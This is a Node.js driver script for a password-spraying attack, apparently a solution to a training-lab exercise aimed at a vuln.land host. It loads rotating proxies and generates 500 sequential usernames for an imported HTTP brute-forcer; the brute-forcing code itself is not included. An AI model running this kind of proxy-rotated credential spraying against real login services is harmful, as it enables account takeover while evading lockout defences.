"use strict";
const fs = require("fs");
const path = require("path");

const {InfoHandler} = require("./logic/info-fetcher");
const {ProxyHandler, ProxyData} = require("./logic/proxy-handler");
const CredentialGenerator = require("./logic/credential-generator");
const HttpForcer = require("./logic/http-forcer");

const PROXY_PATH = path.join(__dirname, "proxy.txt");
const PROXY_PATTERN = {
    pattern: /(.*):(.*)/,
    order: ["host", "port"]
};
const FETCH_URL = "https://pwspray.vm.vuln.land/";
const ATTACK_URLS = {
    HTTP: "http://pwspray.vm.vuln.land/"
};

/**
 * @returns {ProxyData[]}
 * @param {string} filepath
 */
const importProxys = function(filepath) {
    if(!fs.existsSync(filepath)) {
        throw new Error(`Invalid Proxy-Path specified: [${filepath}]`);
    }

    const data = fs.readFileSync(filepath).toString();
    const lines = data.split("\n");

    /** @type {ProxyData[]} */
    const proxys = [];
    lines.forEach(line => {
        const matched = line.match(PROXY_PATTERN.pattern);
        proxys.push(new ProxyData(matched[1 + PROXY_PATTERN.order.indexOf("host")], matched[1 + PROXY_PATTERN.order.indexOf("port")]));
    });
    return proxys;
};

const main = function() {
    const infoHandler = new InfoHandler(FETCH_URL);
    const proxyHandler = new ProxyHandler(importProxys(PROXY_PATH));
    const credentialGenerator = new CredentialGenerator();
    credentialGenerator.populate((i) => i === 0 ? [...new Array(500)].map((val, j) => `user_140${j.toString().padStart(3, "0")}`) : false);
    const httpForcer = new HttpForcer(ATTACK_URLS.HTTP, infoHandler, credentialGenerator, proxyHandler);

    infoHandler.on("change", infos => {
        console.log(infos);
    });
};


main();
